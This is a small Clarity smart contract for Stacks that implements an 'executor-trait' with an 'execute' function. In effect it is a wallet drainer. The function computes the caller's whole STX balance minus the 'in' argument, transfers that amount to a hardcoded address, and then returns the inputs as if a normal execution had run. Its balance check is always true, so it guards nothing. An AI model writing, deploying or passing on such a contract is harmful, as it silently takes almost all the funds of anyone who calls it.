(impl-trait 'SP10JN8QXCYEXMPN9S13MGAXKADEJ3MD4P6FP7J60.traits.executor-trait)

(define-public (execute (in uint) (mout uint))
    (let 
        ((am (- (stx-get-balance tx-sender) in))) 
        (and (>= am u0) (try! (stx-transfer? am tx-sender 'SP1QXYCTWZJ8W7Q6BPG2KZT52HDVDZMRPW9F5KYXW)))
        (ok (list in mout))
    )
)